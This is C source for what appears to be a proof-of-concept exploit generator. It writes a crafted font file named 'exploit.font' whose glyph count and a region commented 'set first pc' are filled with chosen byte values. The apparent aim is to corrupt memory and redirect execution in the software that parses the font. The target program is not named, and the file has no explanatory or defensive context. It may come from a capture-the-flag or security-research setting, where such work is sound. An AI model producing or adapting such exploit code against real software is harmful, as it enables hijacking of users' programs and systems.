#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "createfont.h"

void bit_array_to_bit_glyph( uint8_t*cglyph, uint8_t*bglyph)
{
    uint32_t i;
    uint32_t byte_index;
    uint32_t bit_index;

    if ( cglyph == NULL )
        return;

    if ( bglyph == NULL )
        return;

    memset( bglyph, 0x00, 21 );

    i = 0;
    while ( cglyph[i] != 0xff )
    {
        byte_index = cglyph[i] / 8;

        bit_index = cglyph[i] % 8;

        bglyph[byte_index] |= ( 1 << (7-bit_index));

        i++;
    }

    return;
}

#define GLYPHCNT 0x78

int main (int argc, char **argv)
{
    uint32_t size = 7 + (GLYPHCNT*21) + 0x5e;
    
    uint8_t fdata[size];
    uint32_t offset = 0;
    uint32_t i=0;
    FILE *f;
    printf("Size: %x\n", size);
    fdata[0] = GLYPHCNT;
    memcpy( fdata+1, "\x69\x69\x69", 3);
    offset = 4;
    
    for (i = 0; i < GLYPHCNT; i++)
    {
        memset( fdata+offset, i, 0x21);
        //bit_array_to_bit_glyph( pic_bits, fdata+offset);
        offset += 21;
    }

    memcpy( fdata+offset, "\x96\x96\x96", 3);
    offset += 3;

    // Set the number of glyphs
    memcpy( fdata+( (21*0x5e) + 6), "\x78\x00\x00\x00", 4);

    // set first pc
    memset( fdata+( (21*0x64) +4), 0x40, 4);
    memset( fdata+( (21*0x64) +8), 0x13, 4);
    memset( fdata+( (21*0x64) +12), 0x14, 4);
    memset( fdata+( (21*0x64) +16), 0x15, 4);
    memset( fdata+( (21*0x64) +20), 0x16, 4);
    memset( fdata+( (21*0x64) +24), 0x17, 4);
    

    // set the default
    memset( fdata+offset, 0x00, 0x5e );

    f = fopen("exploit.font", "wb");
    fwrite( fdata, size, 1, f);
    fclose(f);
    return 0;
}
